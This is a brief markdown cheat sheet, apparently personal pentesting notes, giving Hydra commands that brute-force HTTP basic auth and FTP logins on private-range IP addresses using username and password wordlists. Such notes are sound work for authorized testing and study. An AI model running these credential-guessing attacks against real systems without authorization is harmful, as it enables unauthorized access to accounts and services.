# Hydra

## http basic auth

```bash
$ hydra -L username.txt -P password.txt -V -I  -t 1 "http-get://192.168.212.220/:A=BASIC:F=401" 
```

## FTP

```bash
$ hydra -L username.txt -P password.txt -V -I  -t 1 ftp://192.168.151.225 
```

